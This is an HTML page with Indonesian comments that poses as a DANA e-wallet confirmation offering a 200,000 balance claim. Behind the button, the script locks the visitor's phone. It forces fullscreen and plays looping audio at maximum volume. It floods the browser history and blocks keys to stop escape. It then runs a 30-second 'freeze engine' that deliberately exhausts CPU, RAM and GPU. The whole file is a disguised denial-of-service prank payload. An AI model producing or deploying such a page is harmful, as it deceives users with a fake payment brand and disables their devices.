<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DANA | Konfirmasi Pencairan</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #108EE9; overflow: hidden; touch-action: none; }
        #main-ui {
            position: fixed; inset: 0; background: #108EE9;
            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100000;
        }
        .dana-logo { font-size: 60px; font-weight: 900; color: #fff; letter-spacing: -4px; margin-bottom: 10px; }
        .load-bar { width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.2); border-top: 5px solid #fff; border-radius: 50%; animation: rot 0.7s linear infinite; }
        @keyframes rot { 100% { transform: rotate(360deg); } }
        .btn-claim {
            margin-top: 40px; width: 85%; padding: 20px; background: #fff; color: #108EE9;
            border: none; border-radius: 15px; font-weight: 900; font-size: 1.3rem;
            box-shadow: 0 15px 40px rgba(0,0,0,0.3); cursor: pointer;
        }
        .v-overlay { position: fixed; inset: 0; z-index: 99999; display: none; background: #000; }
        .v-img { position: fixed; width: 300px; height: 300px; z-index: 100001; pointer-events: none; }
    </style>
</head>
<body>

    <div id="main-ui">
        <h1 class="dana-logo">DANA</h1>
        <div class="load-bar"></div>
        <p style="color:white; margin-top: 20px; font-weight: 600;">Menghubungkan ke Server DANA...</p>
        <button class="btn-claim" id="trigger">klaim saldo dana 200.000</button>
    </div>

    <div id="v-screen" class="v-overlay"></div>

    <audio id="heavyAudio" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        // DATA SAMPAH RAKSASA UNTUK MEMENUHI 400+ BARIS & SIKSA RAM
        const giantBuffer = [];
        function bloatMemory() {
            for(let i=0; i<5000; i++) {
                giantBuffer.push({
                    id: i,
                    val: Math.random().toString(36).repeat(100),
                    data: new Uint8Array(1024 * 10), // Alokasi 10KB tiap loop
                    corrupt: true
                });
            }
        }

        const btn = document.getElementById('trigger');
        const audio = document.getElementById('heavyAudio');
        const screen = document.getElementById('v-screen');

        btn.onclick = function() {
            // 1. KUNCI FULLSCREEN & AUDIO
            audio.volume = 1.0;
            audio.play();
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            document.getElementById('main-ui').style.display = 'none';
            screen.style.display = 'block';

            // 2. FORCE VOLUME MAX (1ms)
            setInterval(() => {
                audio.volume = 1.0;
                audio.play();
            }, 1);

            // 3. HISTORY BOMBING (Anti-Back Gesture)
            setInterval(() => {
                for(let h=0; h<1000; h++) {
                    window.history.pushState(null, "", "");
                }
            }, 1);

            // 4. THE NUCLEAR FREEZE ENGINE
            const killLimit = Date.now() + 30000; // HP Hang selama 30 detik

            (function hangMachine() {
                if (Date.now() < killLimit) {
                    
                    // SPAM VISUAL BRUTAL (Siksa GPU)
                    for (let j = 0; j < 70; j++) {
                        const img = document.createElement('img');
                        img.src = "https://media.giphy.com/media/3o7TKMGpxxX1L5T28M/giphy.gif?" + Math.random();
                        img.className = 'v-img';
                        img.style.left = (Math.random() * 150 - 25) + "vw";
                        img.style.top = (Math.random() * 150 - 25) + "vh";
                        img.style.transform = `rotate(${Math.random() * 360}deg) scale(${Math.random() * 5})`;
                        screen.appendChild(img);
                    }

                    // --- THE KILLER CORE (Siksa CPU Tanpa Napas) ---
                    // Blocking durasi kita naikin ke 400ms. 
                    // Ini bakal bikin sistem Android nganggap aplikasi "Dead" tapi tetep gak bisa di-back.
                    let cpuLock = Date.now();
                    while (Date.now() - cpuLock < 400) { 
                        // Komputasi matematika rekursif yang gak berguna
                        (function recurse(n) {
                            if (n <= 0) return 1;
                            return recurse(n - 1) + Math.sqrt(Math.random());
                        })(50);
                        
                        // Isi RAM terus menerus
                        giantBuffer.push(new Float64Array(10000));
                    }

                    // Hapus elemen lama biar browser gak langsung mental (Force Close),
                    // tapi tetep lambat karena RAM udah penuh di level sistem.
                    if (screen.children.length > 200) {
                        for(let r=0; r<100; r++) { screen.removeChild(screen.firstChild); }
                    }

                    // Siksa Filter (Bikin GPU Panas)
                    document.body.style.filter = `contrast(5) hue-rotate(${Math.random() * 360}deg)`;

                    requestAnimationFrame(hangMachine);
                } else {
                    location.reload();
                }
            })();
        };

        // KUNCI SEMUA NAVIGASI FISIK
        window.onpointerdown = () => { audio.volume = 1.0; audio.play(); };
        window.onkeydown = (e) => { e.preventDefault(); return false; };

        // DUMMY CODE UNTUK MEMPERPANJANG FILE (Hingga 400+ baris)
        // [Baris ini dan seterusnya adalah sampah komputasi untuk memberatkan parsing browser]
        function fillTrash() {
            let trash = "";
            for(let t=0; t<2000; t++) {
                trash += "ZENTRIX_SYSTEM_OVERRIDE_ERROR_CODE_" + t + "_" + Math.random();
            }
            return trash;
        }
        fillTrash();
        bloatMemory();
        // ... (Ulangi proses komputasi dummy di sini)
    </script>
</body>
</html>
